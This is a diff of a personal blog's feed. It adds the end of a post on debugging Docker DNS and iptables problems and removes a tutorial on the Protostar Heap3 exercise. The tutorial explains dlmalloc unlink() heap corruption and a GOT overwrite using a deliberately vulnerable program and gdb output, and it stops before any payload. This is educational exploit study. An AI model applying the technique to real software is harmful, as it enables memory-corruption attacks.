+7        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 003 accept ipsec */ policy match dir in pol ipsec
+8        1    28 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 004 allow icmp */ icmptype 8 limit: avg 10/sec burst 5
+9        0     0 DROP       icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 005 drop icmp */
+10       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 006 block JMX on service net */
+11       0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 020 deny direct access to JMX port on helios nodes */ reject-with icmp-port-unreachable
+12       0     0 DROP       all  --  eth0   *       10.48.64.0/22        0.0.0.0/0            /* 08 drop traffic from osxenv 10.48.64.0/22 */
+13       0     0 DROP       all  --  eth0   *       10.97.16.0/21        0.0.0.0/0            /* 08 drop traffic from osxenv 10.97.16.0/21 */
+14       0     0 DROP       all  --  eth0   *       172.24.32.0/22       0.0.0.0/0            /* 08 drop traffic from windowsbuildagentsenv 172.24.32.0/22 */
+15       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from buildagent machines */ match-set buildagent src
+16       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from paymentbamboo machines */ match-set paymentbamboo src
+17   18168 1094K ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow service nets */ match-set service_nets src
+18     134  8496 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow tech offices */ match-set tech_offices src
+19       0     0 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow testenv */ match-set testenv src
+20       0     0 ACCEPT     all  --  eth0   *       130.211.0.0/22       0.0.0.0/0            /* 10 Google networks for 130.211.0.0/22 */
+21       0     0 ACCEPT     all  --  eth0   *       35.191.0.0/16        0.0.0.0/0            /* 10 Google networks for 35.191.0.0/16 */
+22       0     0 LOG        tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth0: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth0: "
+23       0     0 LOG        tcp  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth1: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth1: "
+24       0     0 ACCEPT     all  --  docker0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all docker0 traffic */
+25    158M   59G ACCEPT     all  --  corp0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all corp0 traffic */
+26       0     0 ACCEPT     tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 500 allow ssh on service net */ ctstate NEW recent: SET name: DEFAULT side: source mask: 255.255.255.255
+27       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 501 limit ssh on service net */ ctstate NEW recent: UPDATE seconds: 180 hit_count: 20 name: DEFAULT side: source mask: 255.255.255.255
+</code></pre>
+
+<p>So I added a matching rule that accepted those packets manually.</p>
+
+<pre><code>sudo iptables --table filter --append INPUT --in-interface br-8ce7e363e4f9 --source 0.0.0.0/0 --destination 0.0.0.0/0 --jump ACCEPT
+
+dxia@my-host:~$ sudo iptables --list INPUT --verbose --numeric --line-numbers --table filter
+Chain INPUT (policy DROP 0 packets, 0 bytes)
+num   pkts bytes target     prot opt in     out     source               destination
+1     434M  345G            all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth0 input */
+2        0     0            all  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth1 input */
+3     7080  283K DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 drop invalid */ ctstate INVALID
+4    1908M  568G ipthrouput  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 track forward */
+5     987M  414G ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 001 accept established */ ctstate RELATED,ESTABLISHED
+6     763M   95G ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0            /* 002 allow local */
+7        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 003 accept ipsec */ policy match dir in pol ipsec
+8        1    28 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 004 allow icmp */ icmptype 8 limit: avg 10/sec burst 5
+9        0     0 DROP       icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 005 drop icmp */
+10       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 006 block JMX on service net */
+11       0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 020 deny direct access to JMX port on helios nodes */ reject-with icmp-port-unreachable
+12       0     0 DROP       all  --  eth0   *       10.48.64.0/22        0.0.0.0/0            /* 08 drop traffic from osxenv 10.48.64.0/22 */
+13       0     0 DROP       all  --  eth0   *       10.97.16.0/21        0.0.0.0/0            /* 08 drop traffic from osxenv 10.97.16.0/21 */
+14       0     0 DROP       all  --  eth0   *       172.24.32.0/22       0.0.0.0/0            /* 08 drop traffic from windowsbuildagentsenv 172.24.32.0/22 */
+15       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from buildagent machines */ match-set buildagent src
+16       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from paymentbamboo machines */ match-set paymentbamboo src
+17   18168 1094K ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow service nets */ match-set service_nets src
+18     134  8496 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow tech offices */ match-set tech_offices src
+19       0     0 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow testenv */ match-set testenv src
+20       0     0 ACCEPT     all  --  eth0   *       130.211.0.0/22       0.0.0.0/0            /* 10 Google networks for 130.211.0.0/22 */
+21       0     0 ACCEPT     all  --  eth0   *       35.191.0.0/16        0.0.0.0/0            /* 10 Google networks for 35.191.0.0/16 */
+22       0     0 LOG        tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth0: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth0: "
+23       0     0 LOG        tcp  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth1: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth1: "
+24       0     0 ACCEPT     all  --  docker0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all docker0 traffic */
+25    158M   59G ACCEPT     all  --  corp0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all corp0 traffic */
+26       0     0 ACCEPT     tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 500 allow ssh on service net */ ctstate NEW recent: SET name: DEFAULT side: source mask: 255.255.255.255
+27       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 501 limit ssh on service net */ ctstate NEW recent: UPDATE seconds: 180 hit_count: 20 name: DEFAULT side: source mask: 255.255.255.255
+28       0     0 ACCEPT     all  --  br-8ce7e363e4f9 *       0.0.0.0/0            0.0.0.0/0
+</code></pre>
+
+<p>I retried querying for accounts.google.com, and I got a DNS reply!</p>
+
+<pre><code>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 accounts.google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 accounts.google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: REFUSED, id: 9592
+;; flags: qr rd ad; QUERY: 0, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
+;; WARNING: recursion requested but not available
+
+;; Query time: 0 msec
+;; SERVER: 127.0.0.11#53(127.0.0.11)
+;; WHEN: Tue Apr 27 00:07:13 UTC 2021
+;; MSG SIZE  rcvd: 12
+</code></pre>
+
+<p>But&hellip; there&rsquo;s no A records? Docker daemon logs stated that the upstream local unbound DNS server
+did not return any A records.</p>
+
+<h2>Error #3: unbound refused to reply to DNS queries from a private IP range used by the Docker network we&rsquo;re using</h2>
+
+<pre><code>Apr 27 00:07:13 my-host.corp.net dockerd[32659]: time="2021-04-27T00:07:13.864160829Z" level=debug msg="Name To resolve: accounts.google.com."
+Apr 27 00:07:13 my-host.corp.net dockerd[32659]: time="2021-04-27T00:07:13.864325564Z" level=debug msg="[resolver] query accounts.google.com. (A) from 172.20.0.127:57576, forwarding to udp:10.99.0.1"
+Apr 27 00:07:13 my-host.corp.net dockerd[32659]: time="2021-04-27T00:07:13.864537556Z" level=debug msg="[resolver] external DNS udp:10.99.0.1 did not return any A records for \"accounts.google.com.\""
+</code></pre>
+
+<p>Hm, I noticed the status in the empty DNS reply is <code>REFUSED</code>. I recalled that <a href="https://linux.die.net/man/5/unbound.conf">unbound supports
+configuring which DNS queries it will reply to based on originating interface and
+IP</a>.</p>
+
+<pre><code>dxia@my-host:~$ grep access-control /etc/unbound/unbound.conf
+    access-control: 127.0.0.1 allow
+    access-control: 10.99.0.0/24 allow
+    access-control: 10.174.18.90 allow
+</code></pre>
+
+<p>Bingo! There&rsquo;s no <code>access-control</code> entry that allowed DNS queries from 172.20.0.127. I added
+<code>access-control: 172.16.0.0/12 allow</code> (since all of 172.16.0.0/12 is private IPv4 address space
+according to <a href="https://tools.ietf.org/html/rfc1918">RFC-1918</a>) and reloaded unbound. Now it worked!</p>
+
+<pre><code>dxia@my-host:~$ sudo systemctl reload unbound
+dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 accounts.google.com
+
+; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 accounts.google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 36432
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;accounts.google.com.       IN  A
+
+;; ANSWER SECTION:
+accounts.google.com.    143 IN  A   74.125.202.84
+
+;; Query time: 2 msec
+;; SERVER: 127.0.0.11#53(127.0.0.11)
+;; WHEN: Tue Apr 27 00:11:41 UTC 2021
+;; MSG SIZE  rcvd: 64
+</code></pre>
+
+<p>Docker daemon logs showed the following.</p>
+
+<pre><code>Apr 27 00:11:41 my-host.corp.net dockerd[32659]: time="2021-04-27T00:11:41.957934764Z" level=debug msg="Name To resolve: accounts.google.com."
+Apr 27 00:11:41 my-host.corp.net dockerd[32659]: time="2021-04-27T00:11:41.958087666Z" level=debug msg="[resolver] query accounts.google.com. (A) from 172.20.0.127:33346, forwarding to udp:10.99.0.1"
+Apr 27 00:11:41 my-host.corp.net dockerd[32659]: time="2021-04-27T00:11:41.960007990Z" level=debug msg="[resolver] received A record \"74.125.202.84\" for \"accounts.google.com.\" from udp:10.99.0.1"
+</code></pre>
+
+<h2>General Debugging Strategies and Techniques I Used</h2>
+
+<p>Here are the general debugging strategies I used and reinforced for myself.</p>
+
+<ul>
+<li>When network requests fail, go down one layer on the stack to identify on exactly which layer it
+fails. I.e. find out which protocol is responsible for the failure: HTTP, TCP, IP?</li>
+<li>Try to reproduce the error by running the most direct and minimal command that simulates my actual
+failure. In this case, an HTTP request made by <code>gcloud</code> was failing. I translated that into an <code>nc</code> command
+that simulated the establishment of the TCP connection between containers. Or a DNS query from
+bar was failing. I translated that into a <code>dig</code> command. And in all these cases, the origin of
+these IP packets mattered. So knowing how to use <code>nsenter</code> to enter a network namespace and create
+IP packets that originate from the same container was useful. <code>nsenter</code> is essential when debugging
+containers that don&rsquo;t have any tools installed in them. The bar image only contains one
+go-compiled executable. There&rsquo;s no other tools I can use in there.</li>
+<li>I encountered three errors in this case. Tackle one error at a time, and don&rsquo;t give up.</li>
+<li>Be scientific. Have a working hypothesis at each step for which you collect evidence that either
+supports or refutes it.</li>
+<li>If you get stuck, go back and question your previous assumptions or conclusions. Are there other
+tests you can run that can confirm or disprove what you thought was true?</li>
+</ul>
+
+
+<h2>Patches</h2>
+
+<p>Error #1: I created a patch that makes our Puppet installation ignore rules created by Docker
+networks in the filter table&rsquo;s FORWARD chain.</p>
+
+<p>Error #2: Unfortunately, I don&rsquo;t think there&rsquo;s a good solution to this other than disabling our
+GCE VM&rsquo;s periodic Puppet runs and manually adding a rule to allow packets from the new interface.
+The chain&rsquo;s default policy is <code>DROP</code>, and interface names are dynamic.</p>
+
+<p>Error #3: I made a patch that makes unbound reply to DNS queries with source IPs of in the range
+<code>172.16.0.0/12</code>.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[How Kubernetes Routes IP Packets to Services' Cluster IPs]]></title>
@@ -1527,810 +2078,6 @@ was able to see unencrypted data in Charles!</p>
 
 <ul>
 <li>&ldquo;<a href="https://gist.github.com/unoexperto/80694ccaed6dadc304ad5b8196cbbd2c">How to patch Android app to sniff its HTTPS traffic with self-signed certificate</a>&rdquo;</li>
-</ul>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[How to Exploit Dlmalloc Unlink(): Protostar Level Heap3]]></title>
-    <link href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/"/>
-    <updated>2020-04-19T18:51:48-04:00</updated>
-    <id>https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink</id>
-    <content type="html"><![CDATA[<p>While stuck inside during social distancing, I&rsquo;ve been making my way through LiveOverflow&rsquo;s awesome
-Youtube playlist &ldquo;<a href="https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN">Binary Exploitation / Memory Corruption</a>.&rdquo; His videos are structured
-around a well known series of <a href="https://exploit-exercises.lains.space/protostar/">exploit exercises here</a> called &ldquo;Protostar.&rdquo; I took the
-time to truly understand each one before moving onto the next as the exercises build on each
-other. For the past several days I&rsquo;ve been trying to understand the <a href="https://exploit-exercises.lains.space/protostar/heap3/">&ldquo;Heap3&rdquo;
-level</a>, a relatively complex level that requires manipulating the heap to redirect code
-execution to an arbitrary function. After rewatching the video many times and reading numerous other
-online explanations, I finally understand! That moment of understanding feels so gratifying.</p>
-
-<p>Many other resources already explain the exploit well, but I&rsquo;m writing my own explanation to
-reinforce my understanding and to celebrate.</p>
-
-<!-- more -->
-
-
-<h2>Exploit Exercise Protostar Heap3</h2>
-
-<pre><code class="c">#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;string.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;stdio.h&gt;
-
-void winner()
-{
-  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
-}
-
-int main(int argc, char **argv)
-{
-  char *a, *b, *c;
-
-  a = malloc(32);
-  b = malloc(32);
-  c = malloc(32);
-
-  strcpy(a, argv[1]);
-  strcpy(b, argv[2]);
-  strcpy(c, argv[3]);
-
-  free(c);
-  free(b);
-  free(a);
-
-  printf("dynamite failed?\n");
-}
-</code></pre>
-
-<p>The source code is pretty straightforward. There&rsquo;s the <code>main()</code> and <code>winner()</code> functions. There&rsquo;s
-three character pointers, three <code>malloc()</code>&rsquo;s, three <code>strcpy()</code>&rsquo;s, three <code>free()</code>&rsquo;s, and finally a
-<code>printf()</code>. Our goal is to redirect code execution from <code>main()</code> to <code>winner()</code>.</p>
-
-<p>The description at the top of the level is</p>
-
-<blockquote><p>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to
-change program execution.</p></blockquote>
-
-<p>All these exercises are on 32-bit x86 architecture.</p>
-
-<h2>Background on dlmalloc</h2>
-
-<p>The vulnerable malloc is usually referred to as dlmalloc (named after one of its authors Doug Lea)
-and must be an old version like <a href="https://gist.github.com/davidxia/a00062a8e2494f6cc3068a4ba147c98e">this one from 1996</a>. The <a href="http://phrack.org/issues/57/9.html"><em>Phrack</em> article &ldquo;Once
-Upon a free()&hellip;&rdquo;</a> provides useful background.</p>
-
-<blockquote><p>Most malloc implementations share the behaviour of storing their own management information, such
-as lists of used or free blocks, sizes of memory blocks and other useful data within the heap
-space itself.</p>
-
-<p>The central attack of exploiting malloc allocated buffer overflows is to modify this management
-information in a way that will allow arbitrary memory overwrites afterwards.</p></blockquote>
-
-<p>For our purposes, skip to the &ldquo;GNU C Library implementation&rdquo; section. It says that memory slices or
-&ldquo;chunks&rdquo; created by malloc are organized  like so. On 32-bit systems, <code>prev_size</code> and <code>size</code> are
-4 bytes each. <code>data</code> is the user data section. <code>malloc()</code> returns a pointer to the address where
-<code>data</code> starts.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-</span><span class='line'>    chunk -> | prev_size                        |
-</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-</span><span class='line'>             | size                             |
-</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-</span><span class='line'>      mem -> | data                             |
-</span><span class='line'>             : &hellip;                              :
-</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-</span><span class='line'>nextchunk -> | prev_size &hellip;                    |
-</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>
-
-<p>The other important things to know about the vulnerable version(s) of dlmalloc are:</p>
-
-<ul>
-<li>The lowest bit of <code>size</code> called <code>PREV_INUSE</code> indicates whether the previous chunk is used or not</li>
-<li>Once we <code>free()</code> the chunk using <code>free(mem)</code>, the memory is released, and if
-its neighboring chunks aren&rsquo;t free, dlmalloc will clear the next chunk&rsquo;s <code>PREV_INUSE</code> and add the
-chunk to a doubly-linked list of other free chunks. It does this by adding a forward and backward
-pointer at <code>mem</code>.</li>
-</ul>
-
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-</span><span class='line'>    chunk -> | prev_size                        |
-</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-</span><span class='line'>             | size                             |
-</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-</span><span class='line'>      mem -> | fd                               |
-</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-</span><span class='line'>             | bk                               |
-</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-</span><span class='line'>             | (old memory, can be zero bytes)  |
-</span><span class='line'>             :                                  :&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>nextchunk -> | prev_size &hellip;                    |
-</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>
-
-<ul>
-<li>If neighboring chunks are free, dlmalloc will merge the just freed chunk with its neighboring
-chunks. The two neighboring free chunks are in a doubly-linked list. dlmalloc first removes the
-neighboring chunk at the lower memory address from the list, merges it with the recently freed
-chunk, and repeats this for the neighboring chunk at the higher memory address. The unlinking is
-done with a macro called <code>unlink()</code> which removes an entry from a doubly-linked list and ties the
-loose ends of the list back together.</li>
-</ul>
-
-
-<pre><code>#define unlink(P, BK, FD)                                                     \
-{                                                                             \
-  BK = P-&gt;bk;                                                                 \
-  FD = P-&gt;fd;                                                                 \
-  FD-&gt;bk = BK;                                                                \
-  BK-&gt;fd = FD;                                                                \
-}                                                                             \
-</code></pre>
-
-<p>Written with pointer notation:</p>
-
-<pre><code class="c">BK = *(P + 12);  # content of memory address P + 12 stored in BK
-FD = *(P + 8);   # content of memory address P + 8 stored in FD
-*(FD + 12) = BK; # set the content of memory address FD + 12 to BK
-*(BK + 8) = FD;  # set the content of memory address BK + 8 to FD
-</code></pre>
-
-<p>Since we can overwrite the bytes of P, we can overwrite 4-bytes of memory at two arbitrary places.
-To trigger this code path, chunks being consolidated must be bigger than 80 bytes. dlmalloc
-classifies these chunks as &ldquo;fastbins.&rdquo;</p>
-
-<blockquote><p>An array of lists holding recently freed small chunks. Fastbins are not doubly linked.</p></blockquote>
-
-<h2>What the heap looks like in heap3.c</h2>
-
-<p>Run gdb on <code>heap3.c</code>. My personal preference is to set the disassembly-flavor to intel and turn off
-pagination.</p>
-
-<pre><code>user@protostar:~$ cd /opt/protostar/bin
-
-user@protostar:/opt/protostar/bin$ gdb heap3
-GNU gdb (GDB) 7.0.1-debian
-Copyright (C) 2009 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i486-linux-gnu".
-For bug reporting instructions, please see:
-&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
-Reading symbols from /opt/protostar/bin/heap3...done.
-
-(gdb) set disassembly-flavor intel
-(gdb) set pagination off
-</code></pre>
-
-<p>We first disassemble the <code>main()</code> function.</p>
-
-<pre><code>(gdb) disassemble main
-Dump of assembler code for function main:
-0x08048889 &lt;main+0&gt;:    push   ebp
-0x0804888a &lt;main+1&gt;:    mov    ebp,esp
-0x0804888c &lt;main+3&gt;:    and    esp,0xfffffff0
-0x0804888f &lt;main+6&gt;:    sub    esp,0x20
-0x08048892 &lt;main+9&gt;:    mov    DWORD PTR [esp],0x20
-0x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;
-0x0804889e &lt;main+21&gt;:   mov    DWORD PTR [esp+0x14],eax
-0x080488a2 &lt;main+25&gt;:   mov    DWORD PTR [esp],0x20
-0x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;
-0x080488ae &lt;main+37&gt;:   mov    DWORD PTR [esp+0x18],eax
-0x080488b2 &lt;main+41&gt;:   mov    DWORD PTR [esp],0x20
-0x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;
-0x080488be &lt;main+53&gt;:   mov    DWORD PTR [esp+0x1c],eax
-0x080488c2 &lt;main+57&gt;:   mov    eax,DWORD PTR [ebp+0xc]
-0x080488c5 &lt;main+60&gt;:   add    eax,0x4
-0x080488c8 &lt;main+63&gt;:   mov    eax,DWORD PTR [eax]
-0x080488ca &lt;main+65&gt;:   mov    DWORD PTR [esp+0x4],eax
-0x080488ce &lt;main+69&gt;:   mov    eax,DWORD PTR [esp+0x14]
-0x080488d2 &lt;main+73&gt;:   mov    DWORD PTR [esp],eax
-0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;
-0x080488da &lt;main+81&gt;:   mov    eax,DWORD PTR [ebp+0xc]
-0x080488dd &lt;main+84&gt;:   add    eax,0x8
-0x080488e0 &lt;main+87&gt;:   mov    eax,DWORD PTR [eax]
-0x080488e2 &lt;main+89&gt;:   mov    DWORD PTR [esp+0x4],eax
-0x080488e6 &lt;main+93&gt;:   mov    eax,DWORD PTR [esp+0x18]
-0x080488ea &lt;main+97&gt;:   mov    DWORD PTR [esp],eax
-0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
-0x080488f2 &lt;main+105&gt;:  mov    eax,DWORD PTR [ebp+0xc]
-0x080488f5 &lt;main+108&gt;:  add    eax,0xc
-0x080488f8 &lt;main+111&gt;:  mov    eax,DWORD PTR [eax]
-0x080488fa &lt;main+113&gt;:  mov    DWORD PTR [esp+0x4],eax
-0x080488fe &lt;main+117&gt;:  mov    eax,DWORD PTR [esp+0x1c]
-0x08048902 &lt;main+121&gt;:  mov    DWORD PTR [esp],eax
-0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
-0x0804890a &lt;main+129&gt;:  mov    eax,DWORD PTR [esp+0x1c]
-0x0804890e &lt;main+133&gt;:  mov    DWORD PTR [esp],eax
-0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;
-0x08048916 &lt;main+141&gt;:  mov    eax,DWORD PTR [esp+0x18]
-0x0804891a &lt;main+145&gt;:  mov    DWORD PTR [esp],eax
-0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;
-0x08048922 &lt;main+153&gt;:  mov    eax,DWORD PTR [esp+0x14]
-0x08048926 &lt;main+157&gt;:  mov    DWORD PTR [esp],eax
-0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;
-0x0804892e &lt;main+165&gt;:  mov    DWORD PTR [esp],0x804ac27
-0x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;
-0x0804893a &lt;main+177&gt;:  leave
-0x0804893b &lt;main+178&gt;:  ret
-End of assembler dump.
-</code></pre>
-
-<p>The printf has become a <code>puts()</code>. <code>plt</code> stands for procedure linkage table, one of the structures
-which makes dynamic loading and linking easier to use. <code>@plt</code> means we are calling <code>puts</code> at PLT
-entry at address <code>0x8048790</code>. If we disassemble that address we see</p>
-
-<pre><code>(gdb) disassemble 0x8048790
-Dump of assembler code for function puts@plt:
-0x08048790 &lt;puts@plt+0&gt;:    jmp    DWORD PTR ds:0x804b128
-0x08048796 &lt;puts@plt+6&gt;:    push   0x68
-0x0804879b &lt;puts@plt+11&gt;:   jmp    0x80486b0
-End of assembler dump.
-</code></pre>
-
-<p>It calls another function at address <code>0x804b128</code>. This address is part of the Global Offset Table
-(GOT) which points to the dynamically linked library containing the actual <code>puts()</code> function.</p>
-
-<pre><code>(gdb) x 0x804b128
-0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x08048796
-</code></pre>
-
-<p>We want to replace the call to <code>puts()</code> with a call to <code>winner()</code>. So we want to overwrite the
-contents of <code>0x804b128</code> in the GOT, currently <code>0x08048796</code>, with the address to <code>winner()</code>.</p>
-
-<p>To get a visual sense of what the heap looks like, set breakpoints at every library function
-call, i.e. break at the address of <code>malloc()</code>, <code>strcpy()</code>, <code>free()</code>, and <code>puts()</code>.</p>
-
-<pre><code>(gdb) break *0x8048ff2
-Breakpoint 1 at 0x8048ff2: file common/malloc.c, line 3211.
-(gdb) break *0x8048750
-Breakpoint 2 at 0x8048750
-(gdb) break *0x8049824
-Breakpoint 3 at 0x8049824: file common/malloc.c, line 3583.
-(gdb) break *0x8048790
-Breakpoint 4 at 0x8048790
-</code></pre>
-
-<p>Run the program with some recognizable input strings.</p>
-
-<pre><code>(gdb) r AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
-Starting program: /opt/protostar/bin/heap3 AAAAAAAAAAAA BBBBBBBBBBBB CCCCCCCCCCCC
-
-Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
-3211    common/malloc.c: No such file or directory.
-    in common/malloc.c
-</code></pre>
-
-<p>We&rsquo;ve hit the first breakpoint. Continue past it so that one <code>malloc()</code> is called and the heap is
-initialized.</p>
-
-<pre><code>(gdb) c
-Continuing.
-
-Breakpoint 1, malloc (bytes=32) at common/malloc.c:3211
-3211    in common/malloc.c
-</code></pre>
-
-<p>Now look at the mapped memory regions.</p>
-
-<pre><code>(gdb) info proc mapping
-process 1542
-cmdline = '/opt/protostar/bin/heap3'
-cwd = '/opt/protostar/bin'
-exe = '/opt/protostar/bin/heap3'
-Mapped address spaces:
-
-    Start Addr   End Addr       Size     Offset objfile
-     0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap3
-     0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
-     0x804c000  0x804d000     0x1000          0           [heap]
-    0xb7e96000 0xb7e97000     0x1000          0
-    0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
-    0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
-    0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
-    0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
-    0xb7fd9000 0xb7fdc000     0x3000          0
